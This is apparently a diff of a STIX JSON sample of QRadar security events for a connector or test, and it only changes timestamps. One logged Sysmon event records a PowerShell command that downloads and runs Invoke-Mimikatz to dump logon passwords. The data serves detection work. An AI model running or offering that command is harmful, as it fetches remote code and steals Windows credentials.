@@ -6,16 +6,16 @@
 			"type": "identity",
 			"id": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
 			"name": "qradar",
-			"created": "2021-09-27T19:33:00.000Z",
-			"modified": "2021-09-27T18:33:00.000Z",
+			"created": "2021-10-03T19:33:00.000Z",
+			"modified": "2021-10-03T18:33:00.000Z",
 			"identity_class": "events"
 		},
 		{
 			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c92aa2b8d0b7",
 			"type": "observed-data",
 			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
-			"created": "2021-09-27T18:31:00.000Z",
-			"modified": "2021-09-27T18:31:00.000Z",
+			"created": "2021-10-03T18:31:00.000Z",
+			"modified": "2021-10-03T18:31:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -87,16 +87,16 @@
 				"domain_id": 0,
 				"domain_name": "Default Domain"
 			},
-			"first_observed": "2021-09-27T18:31:00.000Z",
-			"last_observed": "2021-09-27T18:31:00.000Z",
+			"first_observed": "2021-10-03T18:31:00.000Z",
+			"last_observed": "2021-10-03T18:31:00.000Z",
 			"number_observed": 1
 		},
 		{
 			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c91aa3b7d1b8",
 			"type": "observed-data",
 			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
-			"created": "2021-09-27T18:32:00.000Z",
-			"modified": "2021-09-27T18:32:00.000Z",
+			"created": "2021-10-03T18:32:00.000Z",
+			"modified": "2021-10-03T18:32:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -175,16 +175,16 @@
 				"domain_id": 0,
 				"domain_name": "Default Domain"
 			},
-			"first_observed": "2021-09-27T18:32:00.000Z",
-			"last_observed": "2021-09-27T18:32:00.000Z",
+			"first_observed": "2021-10-03T18:32:00.000Z",
+			"last_observed": "2021-10-03T18:32:00.000Z",
 			"number_observed": 1
 		},
 		{
 			"id": "observed-data--05ba0f2c-e097-4dc4-aba5-c91aa3b8d1b9",
 			"type": "observed-data",
 			"created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
-			"created": "2021-09-27T19:30:00.000Z",
-			"modified": "2021-09-27T19:30:00.000Z",
+			"created": "2021-10-03T19:30:00.000Z",
+			"modified": "2021-10-03T19:30:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -260,16 +260,16 @@
 				"domain_id": 0,
 				"domain_name": "Default Domain"
 			},
-			"first_observed": "2021-09-27T19:30:00.000Z",
-			"last_observed": "2021-09-27T19:30:00.000Z",
+			"first_observed": "2021-10-03T19:30:00.000Z",
+			"last_observed": "2021-10-03T19:30:00.000Z",
 			"number_observed": 1
 		},
 		{
 			"id": "observed-data--8debb7f7-5031-4581-8951-ebd73a9603ac",
 			"type": "observed-data",
 			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-			"created": "2021-09-27T19:30:00.000Z",
-			"modified": "2021-09-27T19:30:00.000Z",
+			"created": "2021-10-03T19:30:00.000Z",
+			"modified": "2021-10-03T19:30:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -336,16 +336,16 @@
 				"utf8_payload": "WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94188\tTimeGenerated=1570110670\tTimeWritten=1570110670\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:51:10.570 ProcessGuid: {1C2D3F54-FCCE-5D95-0000-001078EB0B00} ProcessId: 2252 Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155) Description: Windows PowerShell Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation CommandLine: powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'\" CurrentDirectory: C:\\Windows\\system32\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=F393D7B531CD44CE418647FE95715ADC3E3C61D2,MD5=EB32C070E658937AA9FA9F3AE629B2B8,SHA256=70BA57FB0BF2F34B86426D21559F5F6D05C1268193904DE8E959D7B06CE964CE,IMPHASH=A4D32F1AEF525B8ADA6A26F28596AC2E ParentProcessGuid: {1C2D3F54-FA72-5D95-0000-0010E2E60900} ParentProcessId: 1668 ParentImage:powershell.exe\" ",
 				"magnitude": 5
 			},
-			"first_observed": "2021-09-27T19:30:00.000Z",
-			"last_observed": "2021-09-27T19:30:00.000Z",
+			"first_observed": "2021-10-03T19:30:00.000Z",
+			"last_observed": "2021-10-03T19:30:00.000Z",
 			"number_observed": 1
 		},
 		{
 			"id": "observed-data--8debb7f7-5031-4581-8951-ebd84a1714ac",
 			"type": "observed-data",
 			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-			"created": "2021-09-27T18:30:00.000Z",
-			"modified": "2021-09-27T18:30:00.000Z",
+			"created": "2021-10-03T18:30:00.000Z",
+			"modified": "2021-10-03T18:30:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -401,16 +401,16 @@
 				"utf8_payload": "",
 				"magnitude": 5
 			},
-			"first_observed": "2021-09-27T18:30:00.000Z",
-			"last_observed": "2021-09-27T18:30:00.000Z",
+			"first_observed": "2021-10-03T18:30:00.000Z",
+			"last_observed": "2021-10-03T18:30:00.000Z",
 			"number_observed": 1
 		},
 		{
 			"id": "observed-data--8debb7f7-5031-4581-8951-ebd84a1715ac",
 			"type": "observed-data",
 			"created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-			"created": "2021-09-27T18:30:00.000Z",
-			"modified": "2021-09-27T18:30:00.000Z",
+			"created": "2021-10-03T18:30:00.000Z",
+			"modified": "2021-10-03T18:30:00.000Z",
 			"objects": {
 				"0": {
 					"type": "ipv4-addr",
@@ -466,8 +466,8 @@
 				"utf8_payload": "",
 				"magnitude": 5
 			},
-			"first_observed": "2021-09-27T18:30:00.000Z",
-			"last_observed": "2021-09-27T18:30:00.000Z",
+			"first_observed": "2021-10-03T18:30:00.000Z",
+			"last_observed": "2021-10-03T18:30:00.000Z",
 			"number_observed": 1
 		}
 	]
